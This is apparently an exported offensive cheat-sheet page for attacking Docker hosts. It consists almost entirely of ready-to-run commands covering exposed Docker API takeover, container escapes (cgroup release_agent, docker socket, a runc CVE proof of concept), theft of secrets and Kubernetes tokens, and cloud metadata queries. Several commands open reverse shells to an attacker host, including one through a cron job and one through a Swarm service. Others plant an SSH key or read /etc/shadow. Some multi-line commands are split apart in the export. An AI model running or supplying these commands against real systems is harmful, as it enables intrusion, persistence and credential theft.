---
id: "1rmfkk9swmptl041e"
title: "docker"
description: ""
tags: []
order: "9"
createdAt: "2026-05-31T09:32:44.786Z"
updatedAt: "2026-05-31T09:33:30.292Z"
---

## Reconnaissance
<!-- section: {"id":"8nl5u7d6ymptl08sz","order":0,"collapsed":false} -->

### fikcgexqtmptl08v9
```bash
nmap -sV -sC -p 2375,2376,2377,4243 $TARGET
```

_Reconnaissance Scan for exposed Docker ports._

**Tags:** docker, recon, nmap
<!-- cmd: {"id":"fikcgexqtmptl08v9","language":"bash","sectionId":"8nl5u7d6ymptl08sz","tags":["docker","recon","nmap"]} -->

### 72bfolk8jmptl08vf
```bash
rustscan -a $TARGET -p 2375,2376 -- -sV -sC
```

**Tags:** docker, recon, nmap
<!-- cmd: {"id":"72bfolk8jmptl08vf","language":"bash","sectionId":"8nl5u7d6ymptl08sz","tags":["docker","recon","nmap"]} -->

### on81bcutbmptl08vj
```bash
curl -s http://$TARGET:2375/version
```

**Tags:** docker, recon, nmap
<!-- cmd: {"id":"on81bcutbmptl08vj","language":"bash","sectionId":"8nl5u7d6ymptl08sz","tags":["docker","recon","nmap"]} -->

### 6hcyc6s76mptl08vo
```bash
curl -s http://$TARGET:2375/info
```

**Tags:** docker, recon, nmap
<!-- cmd: {"id":"6hcyc6s76mptl08vo","language":"bash","sectionId":"8nl5u7d6ymptl08sz","tags":["docker","recon","nmap"]} -->

## Unauthenticated Docker API
<!-- section: {"id":"u3vf09j9rmptl08t6","order":1,"collapsed":false} -->

### q92w847rymptl08w4
```bash
curl -s http://$TARGET:2375/version | python3 -m json.tool
```

_Unauthenticated Docker API Docker daemon exposed without TLS/auth on port 2375._

**Tags:** docker, unauthenticated, api, enumeration
<!-- cmd: {"id":"q92w847rymptl08w4","language":"bash","sectionId":"u3vf09j9rmptl08t6","tags":["docker","unauthenticated","api","enumeration"]} -->

### em9188jhpmptl08w9
```bash
curl -s http://$TARGET:2375/info | python3 -m json.tool
```

**Tags:** docker, unauthenticated, api, enumeration
<!-- cmd: {"id":"em9188jhpmptl08w9","language":"bash","sectionId":"u3vf09j9rmptl08t6","tags":["docker","unauthenticated","api","enumeration"]} -->

### vx1q6v5k1mptl08wf
```bash
curl -s http://$TARGET:2375/containers/json | python3 -m json.tool
```

**Tags:** docker, unauthenticated, api, enumeration
<!-- cmd: {"id":"vx1q6v5k1mptl08wf","language":"bash","sectionId":"u3vf09j9rmptl08t6","tags":["docker","unauthenticated","api","enumeration"]} -->

### bc0uh0e5smptl08wj
```bash
curl -s "http://$TARGET:2375/containers/json?all=1" | python3 -m json.tool
```

**Tags:** docker, unauthenticated, api, enumeration
<!-- cmd: {"id":"bc0uh0e5smptl08wj","language":"bash","sectionId":"u3vf09j9rmptl08t6","tags":["docker","unauthenticated","api","enumeration"]} -->

### gkxgrlimxmptl08wn
```bash
curl -s http://$TARGET:2375/images/json | python3 -m json.tool
```

**Tags:** docker, unauthenticated, api, enumeration
<!-- cmd: {"id":"gkxgrlimxmptl08wn","language":"bash","sectionId":"u3vf09j9rmptl08t6","tags":["docker","unauthenticated","api","enumeration"]} -->

### ptqrmzxiqmptl08wr
```bash
docker -H tcp://$TARGET:2375 version
```

**Tags:** docker, unauthenticated, api, enumeration
<!-- cmd: {"id":"ptqrmzxiqmptl08wr","language":"bash","sectionId":"u3vf09j9rmptl08t6","tags":["docker","unauthenticated","api","enumeration"]} -->

### 3w3ybreesmptl08wz
```bash
docker -H tcp://$TARGET:2375 info
```

**Tags:** docker, unauthenticated, api, enumeration
<!-- cmd: {"id":"3w3ybreesmptl08wz","language":"bash","sectionId":"u3vf09j9rmptl08t6","tags":["docker","unauthenticated","api","enumeration"]} -->

### czintpuzqmptl08x3
```bash
docker -H tcp://$TARGET:2375 ps -a
```

**Tags:** docker, unauthenticated, api, enumeration
<!-- cmd: {"id":"czintpuzqmptl08x3","language":"bash","sectionId":"u3vf09j9rmptl08t6","tags":["docker","unauthenticated","api","enumeration"]} -->

### d008sm7lwmptl08x8
```bash
docker -H tcp://$TARGET:2375 images
```

**Tags:** docker, unauthenticated, api, enumeration
<!-- cmd: {"id":"d008sm7lwmptl08x8","language":"bash","sectionId":"u3vf09j9rmptl08t6","tags":["docker","unauthenticated","api","enumeration"]} -->

## RCE via Exposed Docker API
<!-- section: {"id":"zmz6buaetmptl08ta","order":2,"collapsed":false} -->

### s0wq9oh4emptl08xm
```bash
docker -H tcp://$TARGET:2375 run -it --rm -v /:/host alpine chroot /host /bin/bash
```

_RCE via Exposed Docker API Spawn privileged container and mount host filesystem._

**Tags:** docker, rce, api, exploitation, privesc
<!-- cmd: {"id":"s0wq9oh4emptl08xm","language":"bash","sectionId":"zmz6buaetmptl08ta","tags":["docker","rce","api","exploitation","privesc"]} -->

### w7l8w2petmptl08xt
```bash
docker -H tcp://$TARGET:2375 run --rm -v /:/host alpine cat /host/etc/shadow
```

**Tags:** docker, rce, api, exploitation, privesc
<!-- cmd: {"id":"w7l8w2petmptl08xt","language":"bash","sectionId":"zmz6buaetmptl08ta","tags":["docker","rce","api","exploitation","privesc"]} -->

### psursnvmlmptl08xy
```bash
docker -H tcp://$TARGET:2375 run --rm -v /:/host alpine sh -c \
```

**Tags:** docker, rce, api, exploitation, privesc
<!-- cmd: {"id":"psursnvmlmptl08xy","language":"bash","sectionId":"zmz6buaetmptl08ta","tags":["docker","rce","api","exploitation","privesc"]} -->

### eae0uwg55mptl08y2
```bash
"echo 'ssh-rsa AAAA...' >> /host/root/.ssh/authorized_keys"
```

**Tags:** docker, rce, api, exploitation, privesc
<!-- cmd: {"id":"eae0uwg55mptl08y2","language":"bash","sectionId":"zmz6buaetmptl08ta","tags":["docker","rce","api","exploitation","privesc"]} -->

### m9a5logr9mptl08y7
```bash
docker -H tcp://$TARGET:2375 run --rm -v /:/host alpine sh -c \
```

**Tags:** docker, rce, api, exploitation, privesc
<!-- cmd: {"id":"m9a5logr9mptl08y7","language":"bash","sectionId":"zmz6buaetmptl08ta","tags":["docker","rce","api","exploitation","privesc"]} -->

### 9ftpd7bh9mptl08yb
```bash
"echo '* * * * * root bash -i >& /dev/tcp/$LHOST/4444 0>&1' >> /host/etc/crontab"
```

**Tags:** docker, rce, api, exploitation, privesc
<!-- cmd: {"id":"9ftpd7bh9mptl08yb","language":"bash","sectionId":"zmz6buaetmptl08ta","tags":["docker","rce","api","exploitation","privesc"]} -->

### g91nxyq77mptl08yg
```bash
docker -H tcp://$TARGET:2375 run -it --privileged --pid=host ubuntu nsenter -t 1 -m -u -n -i sh
```

**Tags:** docker, rce, api, exploitation, privesc
<!-- cmd: {"id":"g91nxyq77mptl08yg","language":"bash","sectionId":"zmz6buaetmptl08ta","tags":["docker","rce","api","exploitation","privesc"]} -->

## Container Escape — Privileged Container
<!-- section: {"id":"qzyf3w9thmptl08tf","order":3,"collapsed":false} -->

### 4l54ahgv5mptl08yq
```bash
cat /proc/self/status | grep CapEff
```

_Container Escape — Privileged Container Escape from a running privileged container._

**Tags:** docker, container-escape, privileged, exploitation
<!-- cmd: {"id":"4l54ahgv5mptl08yq","language":"bash","sectionId":"qzyf3w9thmptl08tf","tags":["docker","container-escape","privileged","exploitation"]} -->

### u2lk09cuymptl08yv
```bash
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```

**Tags:** docker, container-escape, privileged, exploitation
<!-- cmd: {"id":"u2lk09cuymptl08yv","language":"bash","sectionId":"qzyf3w9thmptl08tf","tags":["docker","container-escape","privileged","exploitation"]} -->

### 8fh2mg1bmmptl08z0
```bash
echo 1 > /tmp/cgrp/x/notify_on_release
```

_on_

**Tags:** docker, container-escape, privileged, exploitation
<!-- cmd: {"id":"8fh2mg1bmmptl08z0","language":"bash","sectionId":"qzyf3w9thmptl08tf","tags":["docker","container-escape","privileged","exploitation"]} -->

### 3fq9iw8onmptl08z5
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
```

**Tags:** docker, container-escape, privileged, exploitation
<!-- cmd: {"id":"3fq9iw8onmptl08z5","language":"bash","sectionId":"qzyf3w9thmptl08tf","tags":["docker","container-escape","privileged","exploitation"]} -->

### zkqpcq9ffmptl08z9
```bash
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```

_path/cmd" > /tmp/cgrp/release_

**Tags:** docker, container-escape, privileged, exploitation
<!-- cmd: {"id":"zkqpcq9ffmptl08z9","language":"bash","sectionId":"qzyf3w9thmptl08tf","tags":["docker","container-escape","privileged","exploitation"]} -->

### ltdauyupgmptl08zf
```bash
echo '#!/bin/sh' > /cmd
```

**Tags:** docker, container-escape, privileged, exploitation
<!-- cmd: {"id":"ltdauyupgmptl08zf","language":"bash","sectionId":"qzyf3w9thmptl08tf","tags":["docker","container-escape","privileged","exploitation"]} -->

### 4len651j7mptl08zk
```bash
echo "bash -i >& /dev/tcp/$LHOST/4444 0>&1" >> /cmd
```

**Tags:** docker, container-escape, privileged, exploitation
<!-- cmd: {"id":"4len651j7mptl08zk","language":"bash","sectionId":"qzyf3w9thmptl08tf","tags":["docker","container-escape","privileged","exploitation"]} -->

### y4z9go6osmptl08zp
```bash
chmod a+x /cmd
```

**Tags:** docker, container-escape, privileged, exploitation
<!-- cmd: {"id":"y4z9go6osmptl08zp","language":"bash","sectionId":"qzyf3w9thmptl08tf","tags":["docker","container-escape","privileged","exploitation"]} -->

### wivd9n9qdmptl08zu
```bash
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

**Tags:** docker, container-escape, privileged, exploitation
<!-- cmd: {"id":"wivd9n9qdmptl08zu","language":"bash","sectionId":"qzyf3w9thmptl08tf","tags":["docker","container-escape","privileged","exploitation"]} -->

### 2cbp2zymamptl08zx
```bash
fdisk -l
```

**Tags:** docker, container-escape, privileged, exploitation
<!-- cmd: {"id":"2cbp2zymamptl08zx","language":"bash","sectionId":"qzyf3w9thmptl08tf","tags":["docker","container-escape","privileged","exploitation"]} -->

### fabijklpfmptl0902
```bash
mkdir /mnt/host
```

**Tags:** docker, container-escape, privileged, exploitation
<!-- cmd: {"id":"fabijklpfmptl0902","language":"bash","sectionId":"qzyf3w9thmptl08tf","tags":["docker","container-escape","privileged","exploitation"]} -->

### en9ruz6domptl0906
```bash
mount /dev/sda1 /mnt/host
```

**Tags:** docker, container-escape, privileged, exploitation
<!-- cmd: {"id":"en9ruz6domptl0906","language":"bash","sectionId":"qzyf3w9thmptl08tf","tags":["docker","container-escape","privileged","exploitation"]} -->

### 436guu242mptl090b
```bash
chroot /mnt/host
```

**Tags:** docker, container-escape, privileged, exploitation
<!-- cmd: {"id":"436guu242mptl090b","language":"bash","sectionId":"qzyf3w9thmptl08tf","tags":["docker","container-escape","privileged","exploitation"]} -->

## Container Escape — Docker Socket
<!-- section: {"id":"f5z98k0wrmptl08tj","order":4,"collapsed":false} -->

### iehkzl6d7mptl090v
```bash
ls -la /var/run/docker.sock
```

_Container Escape — Docker Socket If /var/run/docker.sock is mounted inside container._

**Tags:** docker, container-escape, socket, exploitation
<!-- cmd: {"id":"iehkzl6d7mptl090v","language":"bash","sectionId":"f5z98k0wrmptl08tj","tags":["docker","container-escape","socket","exploitation"]} -->

### sl4gejj1zmptl0910
```bash
docker -H unix:///var/run/docker.sock run -it --rm -v /:/host alpine chroot /host /bin/bash
```

**Tags:** docker, container-escape, socket, exploitation
<!-- cmd: {"id":"sl4gejj1zmptl0910","language":"bash","sectionId":"f5z98k0wrmptl08tj","tags":["docker","container-escape","socket","exploitation"]} -->

### 85x0cfrobmptl0915
```bash
curl --unix-socket /var/run/docker.sock -s http://localhost/version
```

**Tags:** docker, container-escape, socket, exploitation
<!-- cmd: {"id":"85x0cfrobmptl0915","language":"bash","sectionId":"f5z98k0wrmptl08tj","tags":["docker","container-escape","socket","exploitation"]} -->

### ys26k5atlmptl0919
```bash
curl --unix-socket /var/run/docker.sock -s http://localhost/containers/json
```

**Tags:** docker, container-escape, socket, exploitation
<!-- cmd: {"id":"ys26k5atlmptl0919","language":"bash","sectionId":"f5z98k0wrmptl08tj","tags":["docker","container-escape","socket","exploitation"]} -->

### 31cz9s51mmptl091e
```bash
curl --unix-socket /var/run/docker.sock -s -X POST \
```

**Tags:** docker, container-escape, socket, exploitation
<!-- cmd: {"id":"31cz9s51mmptl091e","language":"bash","sectionId":"f5z98k0wrmptl08tj","tags":["docker","container-escape","socket","exploitation"]} -->

### 1x723kkxfmptl091j
```bash
-H "Content-Type: application/json" \
```

**Tags:** docker, container-escape, socket, exploitation
<!-- cmd: {"id":"1x723kkxfmptl091j","language":"bash","sectionId":"f5z98k0wrmptl08tj","tags":["docker","container-escape","socket","exploitation"]} -->

### 4luhzvsk7mptl091o
```bash
http://localhost/containers/create \
```

**Tags:** docker, container-escape, socket, exploitation
<!-- cmd: {"id":"4luhzvsk7mptl091o","language":"bash","sectionId":"f5z98k0wrmptl08tj","tags":["docker","container-escape","socket","exploitation"]} -->

### ru03ri77fmptl091t
```bash
-d '{"Image":"alpine","Cmd":["/bin/sh","-c","chroot /host && bash"],"Mounts":[{"Type":"bind","Source":"/","Target":"/host"}],"HostConfig":{"Privileged":true}}'
```

**Tags:** docker, container-escape, socket, exploitation
<!-- cmd: {"id":"ru03ri77fmptl091t","language":"bash","sectionId":"f5z98k0wrmptl08tj","tags":["docker","container-escape","socket","exploitation"]} -->

## Container Escape — runc Vulnerability (CVE-2019-5736)
<!-- section: {"id":"rv86qiyjrmptl08to","order":5,"collapsed":false} -->

### 9bsf2s2jbmptl0922
```bash
git clone https://github.com/Frichetten/CVE-2019-5736-PoC
```

_Container Escape — runc Vulnerability (CVE-2019-5736)_

**Tags:** docker, cve, runc, container-escape
<!-- cmd: {"id":"9bsf2s2jbmptl0922","language":"bash","sectionId":"rv86qiyjrmptl08to","tags":["docker","cve","runc","container-escape"]} -->

### 0nd2n60y3mptl0927
```bash
cd CVE-2019-5736-PoC
```

**Tags:** docker, cve, runc, container-escape
<!-- cmd: {"id":"0nd2n60y3mptl0927","language":"bash","sectionId":"rv86qiyjrmptl08to","tags":["docker","cve","runc","container-escape"]} -->

### le3t8mz5ymptl092b
```bash
go build -o exploit main.go
```

**Tags:** docker, cve, runc, container-escape
<!-- cmd: {"id":"le3t8mz5ymptl092b","language":"bash","sectionId":"rv86qiyjrmptl08to","tags":["docker","cve","runc","container-escape"]} -->

### 0u2agr3udmptl092f
```bash
./exploit
```

**Tags:** docker, cve, runc, container-escape
<!-- cmd: {"id":"0u2agr3udmptl092f","language":"bash","sectionId":"rv86qiyjrmptl08to","tags":["docker","cve","runc","container-escape"]} -->

## Container Escape — Capabilities Abuse
<!-- section: {"id":"65ojlywidmptl08tt","order":6,"collapsed":false} -->

### ptfzc8dnzmptl092p
```bash
cat /proc/self/status | grep Cap
```

_Container Escape — Capabilities Abuse_

**Tags:** docker, capabilities, container-escape, privesc
<!-- cmd: {"id":"ptfzc8dnzmptl092p","language":"bash","sectionId":"65ojlywidmptl08tt","tags":["docker","capabilities","container-escape","privesc"]} -->

### a9wshpqfhmptl092t
```bash
capsh --decode=$(cat /proc/self/status | grep CapEff | awk '{print $2}')
```

**Tags:** docker, capabilities, container-escape, privesc
<!-- cmd: {"id":"a9wshpqfhmptl092t","language":"bash","sectionId":"65ojlywidmptl08tt","tags":["docker","capabilities","container-escape","privesc"]} -->

### ejqmbt6swmptl092y
```bash
mount -t tmpfs tmpfs /tmp
```

**Tags:** docker, capabilities, container-escape, privesc
<!-- cmd: {"id":"ejqmbt6swmptl092y","language":"bash","sectionId":"65ojlywidmptl08tt","tags":["docker","capabilities","container-escape","privesc"]} -->

### 76m105ad2mptl0933
```bash
unshare -m
```

**Tags:** docker, capabilities, container-escape, privesc
<!-- cmd: {"id":"76m105ad2mptl0933","language":"bash","sectionId":"65ojlywidmptl08tt","tags":["docker","capabilities","container-escape","privesc"]} -->

### 6nmu6awi9mptl0938
```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

**Tags:** docker, capabilities, container-escape, privesc
<!-- cmd: {"id":"6nmu6awi9mptl0938","language":"bash","sectionId":"65ojlywidmptl08tt","tags":["docker","capabilities","container-escape","privesc"]} -->

### fnk4asatomptl093d
```bash
tcpdump -i eth0
```

**Tags:** docker, capabilities, container-escape, privesc
<!-- cmd: {"id":"fnk4asatomptl093d","language":"bash","sectionId":"65ojlywidmptl08tt","tags":["docker","capabilities","container-escape","privesc"]} -->

## Registry Enumeration
<!-- section: {"id":"uisg247kkmptl08tx","order":7,"collapsed":false} -->

### njoxfcs3imptl0942
```bash
curl -s http://$TARGET:5000/v2/
```

_Registry Enumeration Enumerate Docker registries._

**Tags:** docker, registry, enumeration, secrets
<!-- cmd: {"id":"njoxfcs3imptl0942","language":"bash","sectionId":"uisg247kkmptl08tx","tags":["docker","registry","enumeration","secrets"]} -->

### tgn9bt92omptl0947
```bash
curl -s http://$TARGET:5000/v2/_catalog
```

**Tags:** docker, registry, enumeration, secrets
<!-- cmd: {"id":"tgn9bt92omptl0947","language":"bash","sectionId":"uisg247kkmptl08tx","tags":["docker","registry","enumeration","secrets"]} -->

### t0rrmjjaamptl094c
```bash
curl -s http://$TARGET:5000/v2/$IMAGE/tags/list
```

**Tags:** docker, registry, enumeration, secrets
<!-- cmd: {"id":"t0rrmjjaamptl094c","language":"bash","sectionId":"uisg247kkmptl08tx","tags":["docker","registry","enumeration","secrets"]} -->

### qdg4mwamamptl094g
```bash
curl -s http://$TARGET:5000/v2/$IMAGE/manifests/$TAG
```

**Tags:** docker, registry, enumeration, secrets
<!-- cmd: {"id":"qdg4mwamamptl094g","language":"bash","sectionId":"uisg247kkmptl08tx","tags":["docker","registry","enumeration","secrets"]} -->

### fkcyxayuamptl094k
```bash
docker pull $TARGET:5000/$IMAGE:$TAG
```

**Tags:** docker, registry, enumeration, secrets
<!-- cmd: {"id":"fkcyxayuamptl094k","language":"bash","sectionId":"uisg247kkmptl08tx","tags":["docker","registry","enumeration","secrets"]} -->

### p0o1vjmqpmptl094q
```bash
docker save $TARGET:5000/$IMAGE:$TAG | tar x -C /tmp/img/
```

**Tags:** docker, registry, enumeration, secrets
<!-- cmd: {"id":"p0o1vjmqpmptl094q","language":"bash","sectionId":"uisg247kkmptl08tx","tags":["docker","registry","enumeration","secrets"]} -->

### 60fcq1dknmptl094u
```bash
find /tmp/img/ -name "*.tar" -exec tar x -C /tmp/layer/ -f {} \;
```

**Tags:** docker, registry, enumeration, secrets
<!-- cmd: {"id":"60fcq1dknmptl094u","language":"bash","sectionId":"uisg247kkmptl08tx","tags":["docker","registry","enumeration","secrets"]} -->

### 4bsheqngpmptl094y
```bash
grep -r "password\|secret\|key\|token" /tmp/layer/ 2>/dev/null
```

**Tags:** docker, registry, enumeration, secrets
<!-- cmd: {"id":"4bsheqngpmptl094y","language":"bash","sectionId":"uisg247kkmptl08tx","tags":["docker","registry","enumeration","secrets"]} -->

### vbmvaa7rxmptl0953
```bash
dive $IMAGE:$TAG
```

**Tags:** docker, registry, enumeration, secrets
<!-- cmd: {"id":"vbmvaa7rxmptl0953","language":"bash","sectionId":"uisg247kkmptl08tx","tags":["docker","registry","enumeration","secrets"]} -->

### bmqsosa3wmptl0958
```bash
trivy image $TARGET:5000/$IMAGE:$TAG
```

**Tags:** docker, registry, enumeration, secrets
<!-- cmd: {"id":"bmqsosa3wmptl0958","language":"bash","sectionId":"uisg247kkmptl08tx","tags":["docker","registry","enumeration","secrets"]} -->

## Secret Hunting in Containers
<!-- section: {"id":"0bozflo6emptl08u2","order":8,"collapsed":false} -->

### e4l5e8gcjmptl095k
```bash
cat /run/secrets/*
```

_Secret Hunting in Containers_

**Tags:** docker, secrets, enumeration, post-exploitation
<!-- cmd: {"id":"e4l5e8gcjmptl095k","language":"bash","sectionId":"0bozflo6emptl08u2","tags":["docker","secrets","enumeration","post-exploitation"]} -->

### 1v02e33t0mptl095o
```bash
env | grep -i "pass\|key\|secret\|token\|aws\|api"
```

**Tags:** docker, secrets, enumeration, post-exploitation
<!-- cmd: {"id":"1v02e33t0mptl095o","language":"bash","sectionId":"0bozflo6emptl08u2","tags":["docker","secrets","enumeration","post-exploitation"]} -->

### 3xr98lvtpmptl095t
```bash
cat /proc/1/environ | tr '\0' '\n' | grep -i "pass\|key\|secret"
```

**Tags:** docker, secrets, enumeration, post-exploitation
<!-- cmd: {"id":"3xr98lvtpmptl095t","language":"bash","sectionId":"0bozflo6emptl08u2","tags":["docker","secrets","enumeration","post-exploitation"]} -->

### rikl7222tmptl095y
```bash
find / -name "*.env" -o -name ".env" -o -name "*.conf" 2>/dev/null | xargs grep -l "pass\|secret" 2>/dev/null
```

**Tags:** docker, secrets, enumeration, post-exploitation
<!-- cmd: {"id":"rikl7222tmptl095y","language":"bash","sectionId":"0bozflo6emptl08u2","tags":["docker","secrets","enumeration","post-exploitation"]} -->

### wzvy9i5vzmptl0962
```bash
cat /app/config* 2>/dev/null
```

**Tags:** docker, secrets, enumeration, post-exploitation
<!-- cmd: {"id":"wzvy9i5vzmptl0962","language":"bash","sectionId":"0bozflo6emptl08u2","tags":["docker","secrets","enumeration","post-exploitation"]} -->

### w2lsk9m7vmptl0966
```bash
cat /app/.env 2>/dev/null
```

**Tags:** docker, secrets, enumeration, post-exploitation
<!-- cmd: {"id":"w2lsk9m7vmptl0966","language":"bash","sectionId":"0bozflo6emptl08u2","tags":["docker","secrets","enumeration","post-exploitation"]} -->

### fyk5f2ympmptl096b
```bash
docker inspect $CONTAINER_ID | grep -i env -A 50
```

**Tags:** docker, secrets, enumeration, post-exploitation
<!-- cmd: {"id":"fyk5f2ympmptl096b","language":"bash","sectionId":"0bozflo6emptl08u2","tags":["docker","secrets","enumeration","post-exploitation"]} -->

## Kubernetes Metadata (if in K8s)
<!-- section: {"id":"jcxxg8rnemptl08u6","order":9,"collapsed":false} -->

### 7ckw3hh0tmptl096t
```bash
ls /var/run/secrets/kubernetes.io/ 2>/dev/null
```

_Kubernetes Metadata (if in K8s)_

**Tags:** docker, kubernetes, k8s, cloud, metadata
<!-- cmd: {"id":"7ckw3hh0tmptl096t","language":"bash","sectionId":"jcxxg8rnemptl08u6","tags":["docker","kubernetes","k8s","cloud","metadata"]} -->

### anrqp1z42mptl096y
```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

**Tags:** docker, kubernetes, k8s, cloud, metadata
<!-- cmd: {"id":"anrqp1z42mptl096y","language":"bash","sectionId":"jcxxg8rnemptl08u6","tags":["docker","kubernetes","k8s","cloud","metadata"]} -->

### ceivafxydmptl0973
```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
```

**Tags:** docker, kubernetes, k8s, cloud, metadata
<!-- cmd: {"id":"ceivafxydmptl0973","language":"bash","sectionId":"jcxxg8rnemptl08u6","tags":["docker","kubernetes","k8s","cloud","metadata"]} -->

### 6dxnpm979mptl0979
```bash
APISERVER=https://kubernetes.default.svc
```

**Tags:** docker, kubernetes, k8s, cloud, metadata
<!-- cmd: {"id":"6dxnpm979mptl0979","language":"bash","sectionId":"jcxxg8rnemptl08u6","tags":["docker","kubernetes","k8s","cloud","metadata"]} -->

### sht0gyzsimptl097d
```bash
curl -s $APISERVER/api/v1/namespaces/ --header "Authorization: Bearer $TOKEN" --insecure
```

**Tags:** docker, kubernetes, k8s, cloud, metadata
<!-- cmd: {"id":"sht0gyzsimptl097d","language":"bash","sectionId":"jcxxg8rnemptl08u6","tags":["docker","kubernetes","k8s","cloud","metadata"]} -->

### ix9kcuvvemptl097h
```bash
curl -s $APISERVER/api/v1/namespaces/default/secrets --header "Authorization: Bearer $TOKEN" --insecure
```

**Tags:** docker, kubernetes, k8s, cloud, metadata
<!-- cmd: {"id":"ix9kcuvvemptl097h","language":"bash","sectionId":"jcxxg8rnemptl08u6","tags":["docker","kubernetes","k8s","cloud","metadata"]} -->

### n885p1izomptl097m
```bash
curl -s http://169.254.169.254/latest/meta-data/                   # AWS
```

**Tags:** docker, kubernetes, k8s, cloud, metadata
<!-- cmd: {"id":"n885p1izomptl097m","language":"bash","sectionId":"jcxxg8rnemptl08u6","tags":["docker","kubernetes","k8s","cloud","metadata"]} -->

### pny4kezwamptl097q
```bash
curl -s http://metadata.google.internal/computeMetadata/v1/ -H "Metadata-Flavor: Google"  # GCP
```

**Tags:** docker, kubernetes, k8s, cloud, metadata
<!-- cmd: {"id":"pny4kezwamptl097q","language":"bash","sectionId":"jcxxg8rnemptl08u6","tags":["docker","kubernetes","k8s","cloud","metadata"]} -->

### wfse35v4mmptl097v
```bash
curl -s http://169.254.169.254/metadata/instance?api-version=2021-02-01 -H "Metadata:true"  # Azure
```

**Tags:** docker, kubernetes, k8s, cloud, metadata
<!-- cmd: {"id":"wfse35v4mmptl097v","language":"bash","sectionId":"jcxxg8rnemptl08u6","tags":["docker","kubernetes","k8s","cloud","metadata"]} -->

## Docker Compose / Swarm
<!-- section: {"id":"roypc96o0mptl08ua","order":10,"collapsed":false} -->

### 83uyf8ujlmptl0989
```bash
docker -H tcp://$TARGET:2375 node ls
```

_Docker Compose / Swarm_

**Tags:** docker, swarm, exploitation
<!-- cmd: {"id":"83uyf8ujlmptl0989","language":"bash","sectionId":"roypc96o0mptl08ua","tags":["docker","swarm","exploitation"]} -->

### tl0wckqwrmptl098e
```bash
docker -H tcp://$TARGET:2375 service ls
```

**Tags:** docker, swarm, exploitation
<!-- cmd: {"id":"tl0wckqwrmptl098e","language":"bash","sectionId":"roypc96o0mptl08ua","tags":["docker","swarm","exploitation"]} -->

### pftmu51jpmptl098h
```bash
docker -H tcp://$TARGET:2375 secret ls
```

**Tags:** docker, swarm, exploitation
<!-- cmd: {"id":"pftmu51jpmptl098h","language":"bash","sectionId":"roypc96o0mptl08ua","tags":["docker","swarm","exploitation"]} -->

### r1fbxwvx7mptl098m
```bash
docker -H tcp://$TARGET:2375 secret inspect $SECRET_NAME
```

**Tags:** docker, swarm, exploitation
<!-- cmd: {"id":"r1fbxwvx7mptl098m","language":"bash","sectionId":"roypc96o0mptl08ua","tags":["docker","swarm","exploitation"]} -->

### s7geungbsmptl098r
```bash
docker -H tcp://$TARGET:2375 service create --name pwn --mount type=bind,src=/,dst=/host --entrypoint "chroot /host bash -c 'bash -i >& /dev/tcp/$LHOST/4444 0>&1'" alpine
```

**Tags:** docker, swarm, exploitation
<!-- cmd: {"id":"s7geungbsmptl098r","language":"bash","sectionId":"roypc96o0mptl08ua","tags":["docker","swarm","exploitation"]} -->

## Common Misconfigurations
<!-- section: {"id":"67jgnxly9mptl08ue","order":11,"collapsed":false} -->

### b8sgjf8i0mptl0999
```bash
curl -s http://$TARGET:2375/version
```

_Common Misconfigurations_

**Tags:** docker, misconfiguration, hardening
<!-- cmd: {"id":"b8sgjf8i0mptl0999","language":"bash","sectionId":"67jgnxly9mptl08ue","tags":["docker","misconfiguration","hardening"]} -->

### 4u4bs3lb9mptl099f
```bash
ls -la /var/run/docker.sock
```

**Tags:** docker, misconfiguration, hardening
<!-- cmd: {"id":"4u4bs3lb9mptl099f","language":"bash","sectionId":"67jgnxly9mptl08ue","tags":["docker","misconfiguration","hardening"]} -->

### j901djhp9mptl099k
```bash
whoami && id
```

**Tags:** docker, misconfiguration, hardening
<!-- cmd: {"id":"j901djhp9mptl099k","language":"bash","sectionId":"67jgnxly9mptl08ue","tags":["docker","misconfiguration","hardening"]} -->

### ykx7au1jrmptl099o
```bash
cat /proc/self/status | grep CapEff
```

**Tags:** docker, misconfiguration, hardening
<!-- cmd: {"id":"ykx7au1jrmptl099o","language":"bash","sectionId":"67jgnxly9mptl08ue","tags":["docker","misconfiguration","hardening"]} -->

### hyiwr2uremptl099t
```bash
cat /proc/mounts | grep -E "docker.sock|/proc|/sys|/dev"
```

**Tags:** docker, misconfiguration, hardening
<!-- cmd: {"id":"hyiwr2uremptl099t","language":"bash","sectionId":"67jgnxly9mptl08ue","tags":["docker","misconfiguration","hardening"]} -->

### pqqbus3plmptl099y
```bash
ip addr show | grep docker0
```

**Tags:** docker, misconfiguration, hardening
<!-- cmd: {"id":"pqqbus3plmptl099y","language":"bash","sectionId":"67jgnxly9mptl08ue","tags":["docker","misconfiguration","hardening"]} -->

### r28zh2huamptl09a2
```bash
cat /proc/self/status | grep Seccomp
```

**Tags:** docker, misconfiguration, hardening
<!-- cmd: {"id":"r28zh2huamptl09a2","language":"bash","sectionId":"67jgnxly9mptl08ue","tags":["docker","misconfiguration","hardening"]} -->

## Nuclei Scanning
<!-- section: {"id":"5e2twkdbbmptl08uj","order":12,"collapsed":false} -->

### wmhc57ry6mptl09af
```bash
nuclei -t /root/nuclei-templates/exposed-panels/docker-api-unprotected.yaml -u http://$TARGET:2375
```

_Nuclei Scanning_

**Tags:** docker, nuclei, scanning
<!-- cmd: {"id":"wmhc57ry6mptl09af","language":"bash","sectionId":"5e2twkdbbmptl08uj","tags":["docker","nuclei","scanning"]} -->

### clhm1o9jimptl09ak
```bash
nuclei -t /root/nuclei-templates/ -u http://$TARGET:5000 -tags docker,registry
```

**Tags:** docker, nuclei, scanning
<!-- cmd: {"id":"clhm1o9jimptl09ak","language":"bash","sectionId":"5e2twkdbbmptl08uj","tags":["docker","nuclei","scanning"]} -->
